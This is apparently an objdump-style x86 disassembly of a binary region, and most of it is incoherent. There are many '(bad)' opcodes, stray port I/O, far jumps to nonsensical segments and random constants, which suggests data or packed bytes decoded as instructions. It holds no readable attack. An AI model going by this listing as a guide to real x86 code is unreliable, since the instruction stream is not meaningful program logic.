  419bca:	(bad)  
  419bcc:	jg     0x419c24
  419bce:	call   0xa30f19d9
  419bd3:	jae    0x419be9
  419bd5:	add    ebx,esi
  419bd7:	jno    0x419c53
  419bd9:	jo     0x419bcd
  419bdb:	inc    ebp
  419bdc:	push   esp
  419bdd:	scas   eax,DWORD PTR es:[edi]
  419bde:	lahf   
  419bdf:	mov    dl,0xd5
  419be1:	imul   edx,esp,0xdb231cdb
  419be7:	sbb    al,0x3e
  419be9:	inc    ebp
  419bea:	or     al,0xf7
  419bec:	cmp    ebx,ecx
  419bee:	pushf  
  419bef:	jb     0x419bea
  419bf1:	push   0x16
  419bf3:	das    
  419bf4:	and    dh,ah
  419bf6:	or     eax,0xaacd7eaf
  419bfb:	mov    ch,0xb3
  419bfd:	jo     0x419b8e
  419bff:	nop
  419c00:	shr    DWORD PTR [ebp+0x7a0a2565],1
  419c06:	jecxz  0x419c36
  419c08:	inc    esi
  419c09:	xor    edi,DWORD PTR [esi+0x45]
  419c0c:	cmc    
  419c0d:	sbb    eax,0x7c9537ef
  419c12:	ins    DWORD PTR es:[edi],dx
  419c13:	sahf   
  419c14:	dec    esi
  419c15:	lods   al,BYTE PTR ds:[esi]
  419c16:	(bad)  
  419c17:	mov    esp,0x2d063e95
  419c1c:	pop    ebp
  419c1d:	push   DWORD PTR [edx+0x55]
  419c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c21:	sub    BYTE PTR [edi],cl
  419c23:	mov    bh,0xb0
  419c25:	sahf   
  419c26:	ins    DWORD PTR es:[edi],dx
  419c27:	xor    edi,DWORD PTR [edx+0x68]
  419c2a:	mov    dh,0x6d
  419c2c:	rol    esp,1
  419c2e:	inc    edx
  419c2f:	sbb    al,0xe9
  419c31:	out    0xe2,al
  419c33:	(bad)  
  419c34:	es iret 
  419c36:	sub    eax,0xd1910607
  419c3b:	dec    esp
  419c3c:	not    BYTE PTR [ebx+0x67]
  419c3f:	mov    BYTE PTR [esi],0xe
  419c42:	enter  0x448f,0x44
  419c46:	add    eax,0x6629369
  419c4b:	in     eax,dx
  419c4c:	in     eax,0x6f
  419c4e:	mov    ebp,0x4ca82873
  419c53:	int3   
  419c54:	add    ebx,DWORD PTR [ecx+0xc]
  419c57:	mov    esp,0x1f0ea3ae
  419c5c:	les    esi,FWORD PTR [ecx-0x70]
  419c5f:	push   edx
  419c60:	outs   dx,DWORD PTR ds:[esi]
  419c61:	pop    edx
  419c62:	sbb    DWORD PTR [edi],ecx
  419c64:	sub    ah,BYTE PTR [ebp-0xb]
  419c67:	mov    ch,0xb
  419c69:	mov    esp,0xfaff2cf2
  419c6e:	sbb    eax,0x13ea2fa3
  419c73:	(bad)  
  419c74:	stc    
  419c75:	mov    edx,0xcc5dfa84
  419c7a:	pop    ebx
  419c7b:	xchg   BYTE PTR [edx+0x0],al
  419c7e:	call   0x5d9d6ca2
  419c83:	stc    
  419c84:	xor    eax,esp
  419c86:	dec    ebp
  419c87:	add    DWORD PTR [ebp+edi*8-0x440fe9f1],ebx
  419c8e:	inc    ebx
  419c8f:	rcr    DWORD PTR [eax-0xd],cl
  419c92:	aas    
  419c93:	(bad)  
  419c94:	in     al,dx
  419c95:	add    BYTE PTR ds:0x449a240f,0xb8
  419c9c:	adc    eax,0x2f19ce60
  419ca1:	rcr    BYTE PTR [edi+0x1a71d7b],1
  419ca7:	ss rcr ebx,cl
  419caa:	jecxz  0x419c6f
  419cac:	call   0x129776e5
  419cb1:	fwait
  419cb2:	mov    ch,0x3b
  419cb4:	icebp  
  419cb5:	ret    0x3afb
  419cb8:	in     eax,0x53
  419cba:	mov    dl,0x73
  419cbc:	scas   al,BYTE PTR es:[edi]
  419cbd:	popf   
  419cbe:	or     BYTE PTR [ebp-0x3d],bh
  419cc1:	scas   eax,DWORD PTR es:[edi]
  419cc2:	in     eax,dx
  419cc3:	fld    DWORD PTR ds:0xa30d534f
  419cc9:	test   DWORD PTR [edi+edx*8+0x5ba255bd],eax
  419cd0:	rcl    DWORD PTR [edx],cl
  419cd2:	sbb    BYTE PTR [edx-0x293f0896],0x40
  419cd9:	lock push esi
  419cdb:	aam    0xda
  419cdd:	(bad)  
  419cde:	fmul   DWORD PTR [ebp+0x1d]
  419ce1:	mov    eax,0x940359a9
  419ce6:	sbb    eax,0x9a6c5def
  419ceb:	fs das 
  419ced:	pushf  
  419cee:	test   BYTE PTR [esi],bh
  419cf0:	cmp    DWORD PTR [edi+0x5097a5c1],ebx
  419cf6:	push   ss
  419cf7:	das    
  419cf8:	adc    dh,BYTE PTR [ecx+0x24]
  419cfb:	shl    BYTE PTR [edx-0x64],cl
  419cfe:	int3   
  419cff:	push   ebp
  419d00:	pop    ebp
  419d01:	dec    esp
  419d02:	aaa    
  419d03:	rol    BYTE PTR [edx],0x63
  419d06:	xor    eax,0x6ff8eec0
  419d0b:	stos   BYTE PTR es:[edi],al
  419d0c:	rol    BYTE PTR [eax],1
  419d0e:	cmc    
  419d0f:	or     ebx,DWORD PTR [ebp+0x41]
  419d12:	in     eax,dx
  419d13:	pop    ds
  419d14:	or     eax,0xf4e50b7
  419d19:	sbb    eax,0x9f03d7fa
  419d1e:	xchg   edx,eax
  419d1f:	xor    edx,ebp
  419d21:	cdq    
  419d22:	inc    ebx
  419d24:	daa    
  419d25:	jecxz  0x419d2e
  419d27:	xor    DWORD PTR [edi+0x3a707978],ecx
  419d2d:	mov    cl,0x43
  419d2f:	repz jbe 0x419d11
  419d32:	mov    ebx,0x6de7af92
  419d37:	hlt    
  419d38:	test   al,0x1c
  419d3a:	aas    
  419d3b:	hlt    
  419d3c:	fnstcw WORD PTR [edx]
  419d3e:	inc    eax
  419d3f:	pop    ecx
  419d40:	pop    edx
  419d41:	sar    BYTE PTR [edx+ebx*8+0x7a5ac52b],cl
  419d48:	mov    ebx,0x5621e42b
  419d4d:	aaa    
  419d4e:	dec    eax
  419d4f:	imul   esp,DWORD PTR [edx],0xaf212e65
  419d55:	inc    esp
  419d56:	retf   
  419d57:	jmp    0xd6c20d5d
  419d5c:	sbb    eax,0x48216fb1
  419d61:	das    
  419d62:	sub    al,0x2
  419d64:	sbb    al,0x3b
  419d66:	sbb    BYTE PTR [ecx],0xe4
  419d69:	out    dx,al
  419d6a:	and    al,0xcd
  419d6c:	push   0x78
  419d6e:	test   BYTE PTR [eax],dl
  419d70:	xchg   edx,eax
  419d71:	xchg   ebx,eax
  419d72:	leave  
  419d73:	aas    
  419d74:	lfs    ebp,FWORD PTR [ecx]
  419d77:	mov    al,ds:0xb36406ae
  419d7c:	ret    
  419d7d:	pop    ds
  419d7e:	stos   DWORD PTR es:[edi],eax
  419d7f:	inc    ebx
  419d80:	cdq    
  419d81:	retf   
  419d82:	jg     0x419d65
  419d84:	outs   dx,DWORD PTR ds:[esi]
  419d85:	stc    
  419d86:	dec    edi
  419d87:	xchg   ecx,eax
  419d88:	mov    BYTE PTR [ebp+0x68facd3],0xe0
  419d8f:	test   ecx,ebp
  419d91:	lock adc BYTE PTR [ecx],ch
  419d94:	aam    0xac
  419d96:	xchg   edi,eax
  419d97:	aas    
  419d98:	hlt    
  419d99:	(bad)  
  419d9a:	ja     0x419de3
  419d9c:	jge    0x419dbb
  419d9e:	test   eax,0x28dd17d1
  419da3:	and    eax,0xb7ca3691
  419da8:	xchg   BYTE PTR [esi+0x5917c7f0],bl
  419dae:	in     al,0x12
  419db0:	in     al,dx
  419db1:	clc    
  419db2:	add    ch,ah
  419db4:	jge    0x419d37
  419db6:	outs   dx,DWORD PTR ds:[esi]
  419db7:	xor    eax,0x6989a91f
  419dbc:	shl    BYTE PTR [edi+0x3f],cl
  419dbf:	cmp    eax,0x961bca63
  419dc4:	sbb    edx,ecx
  419dc6:	jge    0x419d5a
  419dc8:	cmp    eax,0x37bbae26
  419dcd:	mov    ds:0x8563222c,al
  419dd2:	into   
  419dd3:	xchg   BYTE PTR [ecx+0xf],al
  419dd6:	in     eax,0x46
  419dd8:	xchg   ebx,eax
  419dd9:	mov    al,ds:0xde807087
  419dde:	and    ecx,esp
  419de0:	sub    eax,0x438e790e
  419de5:	inc    ebp
  419de6:	sbb    ebp,edx
  419de8:	mul    BYTE PTR [edx+0xc39ba8c]
  419dee:	leave  
  419def:	pop    esi
  419df0:	and    bh,BYTE PTR [ebx+edx*4]
  419df3:	sub    al,0xe9
  419df5:	out    0x3b,eax
  419df7:	xor    ch,bl
  419df9:	fnstenv [ecx+0x44]
  419dfc:	cmp    BYTE PTR [ebx-0x74],bl
  419dff:	pop    ss
  419e00:	bound  edi,QWORD PTR ds:0xd434a8b4
  419e06:	ja     0x419e56
  419e08:	pop    ebp
  419e09:	sub    DWORD PTR [edx-0x54],ecx
  419e0c:	fs aad 0x75
  419e0f:	and    al,0xa3
  419e11:	mov    ds:0xd182cdd2,eax
  419e16:	mov    dh,0x29
  419e18:	cmp    al,0x5b
  419e1a:	add    bh,BYTE PTR ds:0x6644bc31
  419e20:	fstp   QWORD PTR [ebx]
  419e22:	add    DWORD PTR [ecx-0x32],ebp
  419e25:	lds    edi,FWORD PTR [ecx+eax*2+0x30]
  419e29:	cwde   
  419e2a:	cmp    edx,eax
  419e2c:	out    0x92,al
  419e2e:	retf   0x5cfb
  419e31:	or     ebx,eax
  419e33:	gs fucom st(1)
  419e36:	pushf  
  419e37:	sub    BYTE PTR [edi-0x15],al
  419e3a:	(bad)  
  419e3b:	aad    0x90
  419e3d:	sub    cl,bh
  419e3f:	ss mov bh,0xb0
  419e43:	loope  0x419e02
  419e45:	enter  0x4512,0xf
  419e49:	(bad)  
  419e4a:	sub    ch,BYTE PTR [edi-0x1b58743d]
  419e50:	arpl   WORD PTR [eax-0x386855f1],di
  419e56:	fcom   QWORD PTR [edx+0xb]
  419e59:	popf   
  419e5a:	jg     0x419ddc
  419e5c:	jns    0x419e37
  419e5e:	bound  edi,QWORD PTR [eax+0x7cc22e2f]
  419e64:	dec    esi
  419e65:	(bad)  
  419e66:	loope  0x419e1e
  419e68:	outs   dx,BYTE PTR ds:[esi]
  419e69:	xchg   esi,eax
  419e6a:	pop    ss
  419e6b:	out    dx,eax
  419e6c:	pop    eax
  419e6d:	jno    0x419e70
  419e6f:	push   eax
  419e70:	pop    ss
  419e71:	pop    ss
  419e72:	or     ebp,DWORD PTR [esi-0x66]
  419e75:	retf   
  419e76:	sub    eax,0x43aa774b
  419e7b:	repz inc ebp
  419e7d:	ficom  WORD PTR [ebp-0x15]
  419e80:	push   edx
  419e81:	push   ebp
  419e82:	dec    edx
  419e83:	mov    bl,0xbb
  419e85:	adc    al,0xd0
  419e87:	jmp    0x419e2e
  419e89:	jns    0x419e36
  419e8b:	mov    esp,0x76ad7305
  419e90:	or     al,0xac
  419e92:	dec    ebp
  419e93:	mov    ds:0xa0a79286,al
  419e98:	cld    
  419e99:	(bad)  
  419e9a:	icebp  
  419e9b:	pop    esp
  419e9c:	inc    esp
  419e9d:	or     bl,BYTE PTR [eax]
  419e9f:	sub    eax,0xd33a8f82
  419ea4:	clc    
  419ea5:	mov    cl,0xb2
  419ea7:	add    al,0x66
  419ea9:	or     DWORD PTR [ebx-0xf],0x15c7d3dc
  419eb0:	push   0x3a
  419eb2:	dec    eax
  419eb3:	int3   
  419eb4:	pop    eax
  419eb5:	inc    edx
  419eb6:	jecxz  0x419e7f
  419eb8:	push   ds
  419eb9:	fdivp  st(0),st
  419ebb:	xchg   edx,eax
  419ebc:	jae    0x419e5b
  419ebe:	addr16 enter 0xe2c5,0x78
  419ec3:	pop    ss
  419ec4:	fiadd  DWORD PTR [ebp+0x573314bc]
  419eca:	inc    esi
  419ecb:	mov    ch,0x20
  419ecd:	or     eax,0xc03c4bc0
  419ed2:	jp     0x419e9c
  419ed4:	in     eax,0x13
  419ed6:	mov    ds:0xa7cfc67a,al
  419edb:	call   0x5421:0x2e396dc1
  419ee2:	ja     0x419f3d
  419ee4:	xchg   BYTE PTR [esi],al
  419ee6:	aas    
  419ee7:	or     al,0xcc
  419ee9:	mov    eax,0x20a4ace8
  419eee:	fist   DWORD PTR [esp+ecx*2+0x6e154ec]
  419ef5:	lahf   
  419ef6:	lods   al,BYTE PTR ds:[esi]
  419ef7:	repz loope 0x419ebf
  419efa:	addr16 inc ebp
  419efc:	ret    
  419efd:	xchg   ebp,eax
  419efe:	ror    DWORD PTR [edi+0x2e],0xfb
  419f02:	iret   
  419f03:	add    eax,0xa6410665
  419f08:	xchg   DWORD PTR [ebx-0x25],ebx
  419f0b:	sub    DWORD PTR ds:0x6bec5e0e,edx
  419f11:	xor    DWORD PTR [esi-0x2d3c952],ebp
  419f17:	jg     0x419f38
  419f19:	shl    DWORD PTR [edi-0x70d17a2f],1
  419f1f:	jns    0x419ed6
  419f21:	pusha  
  419f22:	xor    BYTE PTR [ebx+0x73f49577],bl
  419f28:	xchg   esi,eax
  419f2a:	ss cwde 
  419f2c:	ret    
  419f2d:	aad    0x78
  419f2f:	cdq    
  419f30:	cld    
  419f31:	rol    DWORD PTR [ecx+ebx*1-0x3cb12cf],cl
  419f38:	sub    al,0x82
  419f3a:	in     al,dx
  419f3b:	lods   eax,DWORD PTR ds:[esi]
  419f3c:	xchg   esi,eax
  419f3d:	out    dx,al
  419f3e:	mov    eax,ds:0xe852445b
  419f43:	out    0xfd,al
  419f45:	popf   
  419f46:	xor    al,0x91
  419f48:	call   0xc748a9ea
  419f4d:	jno    0x419f59
  419f4f:	(bad)  
  419f50:	dec    esp
  419f51:	sbb    esp,DWORD PTR [esi-0x72]
  419f54:	pop    ecx
  419f55:	mov    ds:0xca1e2368,al
  419f5a:	retf   
  419f5b:	fs inc eax
  419f5d:	xchg   BYTE PTR [ebx+0x46],dh
  419f60:	cmc    
  419f61:	out    0x53,eax
  419f63:	enter  0xd461,0xe
  419f67:	jmp    0x7665:0x618d4db1
  419f6e:	pushf  
  419f6f:	and    eax,0x5db27e73
  419f74:	adc    esi,ebp
  419f76:	scas   eax,DWORD PTR es:[edi]
  419f77:	xchg   esi,eax
  419f78:	xchg   bh,ch
  419f7a:	jmp    0xab97:0x804113e5
  419f81:	mov    dl,BYTE PTR [esi+0x10dd7db6]
  419f87:	push   ecx
  419f88:	std    
  419f89:	shl    BYTE PTR [ecx+esi*1],cl
  419f8c:	test   al,0xc6
  419f8e:	and    ah,BYTE PTR [edx-0x9]
  419f91:	arpl   di,sp
  419f93:	cwde   
  419f94:	sbb    ebx,DWORD PTR [ebx-0x4fb0c02a]
  419f9a:	jecxz  0x419ffa
  419f9c:	add    BYTE PTR [esi+0x68],dh
  419f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fa0:	jns    0x41a011
  419fa2:	rcr    DWORD PTR ds:0x356c1468,0x4f
  419fa9:	je     0x41a027
  419fab:	pusha  
  419fac:	call   0xcd21:0x2d1b0be7
  419fb3:	rcr    DWORD PTR [esi+esi*8],cl
  419fb6:	int3   
  419fb7:	bnd call 0x86173c20
  419fbd:	dec    edx
  419fbe:	ds push ds
  419fc0:	pop    edi
  419fc1:	mov    dh,BYTE PTR [ebp-0x53]
  419fc4:	dec    ebx
  419fc5:	test   eax,0xfdff8df3
  419fca:	dec    edx
  419fcb:	push   edi
  419fcc:	clc    
  419fcd:	dec    ebx
  419fce:	push   ss
  419fcf:	jne    0x41a00d
  419fd1:	or     ah,BYTE PTR [esi-0x7634e279]
  419fd7:	icebp  
  419fd8:	adc    al,0x4d
  419fda:	jno    0x419f76
  419fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fdd:	sub    DWORD PTR [esi+0x7e9ea7a1],ebx
  419fe3:	lods   al,BYTE PTR ds:[esi]
  419fe4:	mov    bl,0xce
  419fe6:	or     edi,ebp
  419fe8:	sub    DWORD PTR [esi],edi
  419fea:	push   0xffffffec
  419fec:	or     cl,BYTE PTR [esi+esi*2]
  419fef:	out    0x8,eax
  419ff1:	imul   DWORD PTR [ebx]
  419ff3:	mov    ds:0x7187460e,al
  419ff8:	stos   DWORD PTR es:[edi],eax
  419ff9:	jnp    0x419fbb
  419ffb:	sar    BYTE PTR [esi-0x2500a071],0xd4
  41a002:	jmp    DWORD PTR [ebp-0x2d]
  41a005:	int3   
  41a006:	mov    dl,0xc5
  41a008:	jo     0x419fa0
  41a00a:	push   ebp
  41a00b:	xor    edx,DWORD PTR [esi]
  41a00d:	or     DWORD PTR [edx+0x17],0x133a477
  41a014:	dec    esp
  41a015:	pop    edi
  41a016:	sar    BYTE PTR fs:[ecx+ebp*4+0x556dd0ac],1
  41a01e:	sbb    BYTE PTR ds:[ebx-0x3c54c9de],cl
  41a025:	call   0x2327:0x50580cf
  41a02c:	test   eax,0x7a3129b3
  41a031:	push   cs
  41a032:	mov    ds:0x78b257e0,eax
  41a037:	loopne 0x41a04d
  41a039:	xor    eax,0x30a92efd
  41a03e:	pop    ds
  41a03f:	inc    ebp
  41a040:	mov    DWORD PTR [edi+ebx*2],0x6d3d214c
  41a047:	jp     0x41a0a4
  41a049:	pop    es
  41a04a:	iret   
  41a04b:	or     eax,0x54f3400d
  41a050:	inc    esi
  41a051:	add    edx,edi
  41a053:	clc    
  41a054:	add    ecx,DWORD PTR [ebp+edi*4+0x63]
  41a058:	cmp    bl,BYTE PTR ds:0xb8efce6e
  41a05e:	out    dx,eax
  41a05f:	(bad)  
  41a060:	and    eax,DWORD PTR [eax]
  41a062:	repnz sub al,0xc2
  41a065:	popa   
  41a066:	in     al,dx
  41a067:	or     BYTE PTR [ebx],0x36
  41a06a:	xchg   DWORD PTR [edi],ecx
  41a06c:	fisttp DWORD PTR [esi+0x68]
  41a06f:	popa   
  41a070:	push   0xfe68708f
  41a075:	aas    
  41a076:	lea    ecx,[ecx+ebp*2-0x53339040]
  41a07d:	test   eax,0xa3d319c
  41a082:	mov    ebp,es
  41a084:	pop    esp
  41a085:	xchg   edi,eax
  41a086:	loop   0x41a08c
  41a088:	shl    DWORD PTR [edx],0xca
  41a08b:	pop    edx
  41a08c:	shl    cl,cl
  41a08e:	mov    ebp,0x5dc4f2a0
  41a093:	les    ecx,FWORD PTR [edi]
  41a095:	xchg   ebx,eax
  41a096:	dec    ecx
  41a097:	adc    edx,DWORD PTR [eax-0xb]
  41a09a:	mov    ax,0xc71f
  41a09e:	pop    ebx
  41a09f:	sub    dh,ah
  41a0a1:	out    0xf4,al
  41a0a3:	xor    BYTE PTR [edx],0x80
  41a0a6:	jns    0x41a048
  41a0a8:	(bad)  
  41a0aa:	mov    eax,ds:0x4d3aaf5b
  41a0af:	test   al,0xf4
  41a0b1:	push   ds
  41a0b2:	fsub   st,st(5)
  41a0b4:	xor    DWORD PTR [esi],ebx
  41a0b6:	cli    
  41a0b7:	les    ecx,FWORD PTR [ebp-0xd]
  41a0ba:	jge    0x41a10a
  41a0bc:	mov    ds:0x164433a1,eax
  41a0c1:	xchg   esp,eax
  41a0c2:	jnp    0x41a046
  41a0c4:	stos   BYTE PTR es:[edi],al
  41a0c5:	lods   al,BYTE PTR ds:[esi]
  41a0c6:	loop   0x41a0d1
  41a0c8:	cmp    DWORD PTR [ebp-0x661b4844],edx
  41a0ce:	mov    dh,0x35
  41a0d0:	mov    ebp,0xceda55b9
  41a0d5:	lods   al,BYTE PTR ds:[esi]
  41a0d6:	add    DWORD PTR [esi-0x13883f63],esi
  41a0dc:	lock xlat BYTE PTR ds:[ebx]
  41a0de:	retf   
  41a0df:	xor    BYTE PTR [ebp+0x2c],bh
  41a0e2:	mov    dh,0x3
  41a0e4:	div    DWORD PTR [edi-0x7b]
  41a0e7:	mov    DWORD PTR [edx+0x16],esi
  41a0ea:	sbb    eax,0x95630767
  41a0ef:	aaa    
  41a0f0:	outs   dx,BYTE PTR ds:[esi]
  41a0f1:	addr16 pop edi
  41a0f3:	ret    
  41a0f4:	shr    DWORD PTR [ebx-0x2496239c],cl
  41a0fa:	xor    dh,BYTE PTR [edi+0x55]
  41a0fd:	mov    ch,0xa5
  41a0ff:	add    eax,0x1628511a
  41a104:	jno    0x41a0f3
  41a106:	xchg   ebp,eax
  41a107:	sti    
  41a108:	lock push 0x4cc8a395
  41a10e:	dec    edi
  41a10f:	jns    0x41a0ac
  41a111:	pop    es
  41a112:	test   al,0xe3
  41a114:	mov    WORD PTR [edx+eiz*2],ss
  41a117:	jnp    0x41a16c
  41a119:	sahf   
  41a11a:	sbb    ecx,DWORD PTR [edx+0x21ab1f24]
  41a120:	xchg   esi,eax
  41a121:	adc    edi,DWORD PTR [ebx]
  41a123:	rcl    BYTE PTR [eax],cl
  41a125:	add    al,0x81
  41a127:	or     al,0xc8
  41a129:	or     DWORD PTR [esi],esp
  41a12b:	lock jnp 0x41a0c4
  41a12e:	and    BYTE PTR [esi+0x3c28027f],dh
  41a134:	push   esp
  41a135:	(bad)
  41a138:	fwait
  41a139:	inc    edx
  41a13a:	pusha  
  41a13b:	int3   
  41a13c:	rol    BYTE PTR [ebx],1
  41a13e:	in     eax,0xdd
  41a140:	rcr    DWORD PTR [esi],cl
  41a142:	les    ebx,FWORD PTR [ebx-0x41]
  41a145:	jno    0x41a0dc
  41a147:	sbb    eax,0x4c43634c
  41a14c:	and    BYTE PTR [edx+0x66],0x11
  41a150:	inc    edx
  41a151:	fcomp  QWORD PTR [edx+esi*8+0xbdbf551]
  41a158:	xchg   ebp,eax
  41a159:	mov    bl,0x76
  41a15b:	mov    ds:0x247469f7,al
  41a160:	test   DWORD PTR [esi+0xb],0x320ed603
  41a167:	or     eax,0xe4887eac
  41a16c:	mov    DWORD PTR [eax],ebp
  41a16e:	lods   al,BYTE PTR ds:[esi]
  41a16f:	outs   dx,DWORD PTR ds:[esi]
  41a170:	out    dx,eax
  41a171:	scas   eax,DWORD PTR es:[edi]
  41a172:	popa   
  41a173:	add    bh,bl
  41a175:	sub    al,0xb9
  41a177:	call   DWORD PTR [edx+0x40e00abe]
  41a17d:	leave  
  41a17e:	scas   eax,DWORD PTR es:[edi]
  41a17f:	xor    BYTE PTR [edx-0x1c5ffb0b],bh
  41a185:	mov    edi,0x9e3a8fb7
  41a18a:	jnp    0x41a1d7
  41a18c:	mov    bh,0xb8
  41a18e:	inc    esi
  41a18f:	xchg   esi,eax
  41a190:	mov    eax,ds:0xbd0e86a7
  41a195:	imul   edx,DWORD PTR [eax+edx*2+0x35],0x71d33b22
  41a19d:	int    0xa4
  41a19f:	mov    bh,0x5e
  41a1a1:	mov    eax,ds:0x92d9ded8
  41a1a6:	out    dx,eax
  41a1a7:	jnp    0x41a1e6
  41a1a9:	mov    edx,0xccb81329
  41a1ae:	loope  0x41a1ae
  41a1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1b1:	inc    ecx
  41a1b2:	fs jl  0x41a20e
  41a1b5:	fldenv [ebx-0x36]
  41a1b8:	xchg   edi,eax
  41a1b9:	fs loopne 0x41a235
  41a1bc:	jb     0x41a21b
  41a1be:	mov    dl,bl
  41a1c0:	int    0xad
  41a1c2:	sbb    ebx,edx
  41a1c4:	nop
  41a1c5:	hlt    
  41a1c6:	ins    BYTE PTR es:[edi],dx
  41a1c7:	mov    esp,0x713566be
  41a1cc:	cli    
  41a1cd:	ret    0xe75b
  41a1d0:	mov    edi,0x5042d378
  41a1d5:	mov    bh,0x7e
  41a1d7:	jmp    0x210:0x50156d64
  41a1de:	xlat   BYTE PTR ds:[ebx]
  41a1df:	loop   0x41a234
  41a1e1:	adc    dh,dl
  41a1e3:	ja     0x41a1f6
  41a1e5:	dec    edi
  41a1e6:	in     al,0x95
  41a1e8:	cmp    al,0x9b
  41a1ea:	stos   BYTE PTR es:[edi],al
  41a1eb:	mov    ds:0x4731ac3f,eax
  41a1f0:	(bad)  
  41a1f1:	je     0x41a1a8
  41a1f3:	jmp    0x41a192
  41a1f5:	add    ebx,DWORD PTR [esi+0x59db5a53]
  41a1fb:	xlat   BYTE PTR ds:[ebx]
  41a1fc:	add    BYTE PTR [ecx-0x7ef6ee3b],bh
  41a202:	mov    cl,0xcc
  41a204:	jo     0x41a193
  41a206:	mov    eax,DWORD PTR [edx]
  41a208:	adc    BYTE PTR [ebx+0x5b],dh
  41a20b:	sti    
  41a20c:	in     eax,0x90
  41a20e:	popf   
  41a20f:	fwait
  41a210:	adc    al,0x10
  41a212:	xchg   ebx,eax
  41a213:	cmp    eax,0x8471ee73
  41a218:	or     al,0x86
  41a21a:	dec    esp
  41a21b:	mov    dh,0x84
  41a21d:	outs   dx,DWORD PTR ds:[esi]
  41a21e:	xchg   esi,eax
  41a21f:	ret    
  41a220:	sti    
  41a221:	imul   BYTE PTR [edi-0x76]
  41a224:	xor    BYTE PTR [eax+0x7],dl
  41a227:	es jae 0x41a222
  41a22a:	push   ds
  41a22b:	adc    DWORD PTR [ebp+0x296cbd61],ebx
  41a231:	les    esp,FWORD PTR [eax-0x6e]
  41a234:	popa   
  41a235:	and    bl,ah
  41a237:	cmp    DWORD PTR [edx+0x36df6934],ecx
  41a23d:	adc    BYTE PTR ds:0xc2733546,0x9b
  41a244:	and    eax,0x2ada60a9
  41a249:	dec    edi
  41a24a:	addr16 lock dec edx
  41a24d:	sub    ch,BYTE PTR [ebp+0x3c]
  41a250:	fmul   st,st(7)
  41a252:	mov    ebp,0x8a160b8a
  41a257:	popa   
  41a258:	mov    al,ah
  41a25a:	push   edx
  41a25b:	mov    DWORD PTR [ebp-0x78],edi
  41a25e:	gs xchg edx,eax
  41a260:	xchg   DWORD PTR [edx+ebx*4],ecx
  41a263:	ins    BYTE PTR es:[edi],dx
  41a264:	pop    ecx
  41a265:	xor    DWORD PTR [edx+0x26],ebx
  41a268:	xor    al,0x0
  41a26a:	icebp  
  41a26b:	inc    BYTE PTR [ebp-0x6f]
  41a26e:	mov    edx,DWORD PTR [edx+0x4d204936]
  41a274:	cmp    al,0xbb
  41a276:	mov    cl,0x1
  41a278:	rol    BYTE PTR [esi-0x1e169f49],cl
  41a27e:	adc    bl,BYTE PTR [esi+0x6]
  41a281:	sbb    esp,eax
  41a283:	mov    dh,BYTE PTR [edi-0x136e927a]
  41a289:	mov    ebp,0x8d1722ab
  41a28e:	out    dx,eax
  41a28f:	push   DWORD PTR [eax+0x1a64aad9]
  41a295:	imul   ebx,DWORD PTR [eax],0x1f1e6e5e
  41a29b:	pop    ds
  41a29c:	mov    esp,0x70b205d
  41a2a1:	mov    BYTE PTR [ecx+0x17b1cc31],dl
  41a2a7:	rcl    DWORD PTR [edx-0x72],1
  41a2aa:	ds jmp 0x41a2a2
  41a2ad:	mov    dh,0x96
  41a2af:	mov    eax,0x62cd198d
  41a2b4:	pop    esi
  41a2b5:	loopne 0x41a320
  41a2b7:	leave  
  41a2b8:	retf   0x2d60
  41a2bb:	sub    eax,0xed091646
  41a2c0:	(bad)  
  41a2c1:	xor    dh,bh
  41a2c3:	arpl   WORD PTR [esi],sp
  41a2c5:	neg    BYTE PTR [eax-0x1e]
  41a2c8:	bnd jo 0x41a295
  41a2cb:	mov    ah,0x6e
  41a2cd:	fisubr DWORD PTR [edx]
  41a2cf:	js     0x41a2ed
  41a2d1:	xchg   edi,eax
  41a2d2:	and    al,BYTE PTR [eax]
  41a2d4:	data16 or ch,BYTE PTR [ecx+edi*1-0x1ebbc51b]
  41a2dc:	fistp  DWORD PTR [ebx+0x3b]
  41a2df:	stos   DWORD PTR es:[edi],eax
  41a2e0:	loopne 0x41a298
  41a2e2:	addr16 ss addr16 sbb al,0xf1
  41a2e7:	mov    ebp,0xe9c879cb
  41a2ec:	push   0x7c3a98da
  41a2f1:	and    BYTE PTR [edx+0x63240ebe],ch
  41a2f7:	dec    esp
  41a2f8:	sub    al,0xff
  41a2fa:	icebp  
  41a2fb:	push   eax
  41a2fc:	sub    dl,BYTE PTR [esi+0x78]
  41a2ff:	dec    ebx
  41a300:	cmp    al,0x8c
  41a302:	cs loope 0x41a30a
  41a305:	lods   eax,DWORD PTR ds:[esi]
  41a306:	movhps QWORD PTR [esi+0xe],xmm6
  41a30a:	xchg   BYTE PTR [eax],ah
  41a30c:	outs   dx,BYTE PTR ds:[esi]
  41a30d:	or     DWORD PTR [ecx],esi
  41a30f:	jmp    0x46f9a068
  41a314:	(bad)  [edx+0x3e]
  41a317:	and    DWORD PTR [esp+esi*8-0x63],0x46
  41a31c:	push   cs
  41a31d:	inc    esi
  41a31f:	sub    al,0x6e
  41a321:	cli    
  41a322:	imul   edi,DWORD PTR [ebp+0x7b],0xffffffb3
  41a326:	inc    eax
  41a327:	mov    al,0x1b
  41a329:	out    dx,al
  41a32a:	sub    WORD PTR [esi+0x43],0x8445
  41a330:	sti    
  41a331:	sub    al,0xaa
  41a333:	mov    cl,0xd4
  41a335:	icebp  
  41a336:	js     0x41a2f3
  41a338:	or     al,0x35
  41a33a:	lea    edi,[ecx-0x11]
  41a33d:	gs mov bh,0x1b
  41a340:	or     DWORD PTR [ebp+0x2c65c710],esi
  41a346:	shl    dl,cl
  41a348:	out    0x0,al
  41a34a:	lock or al,0x95
  41a34d:	inc    ebp
  41a34e:	call   0x19f6a810
  41a353:	repnz stc 
  41a355:	scas   al,BYTE PTR es:[edi]
  41a356:	pop    es
  41a357:	xchg   DWORD PTR [edi-0xb],ebx
  41a35a:	jmp    0x3c00:0xcc0dff36
  41a361:	js     0x41a36f
  41a363:	inc    ecx
  41a364:	mov    ds:0xa204032d,eax
  41a369:	out    0x5d,al
  41a36b:	ret    0xb398
  41a36e:	xchg   edx,eax
  41a36f:	ret    0x114d
  41a372:	jg     0x41a2f6
  41a374:	enter  0x1eab,0x4e
  41a378:	jmp    FWORD PTR [eiz*1+0x584edfdd]
  41a37f:	mov    ds:0xbba24d9e,eax
  41a384:	inc    edx
  41a385:	out    0x78,al
  41a387:	cmp    al,0xcf
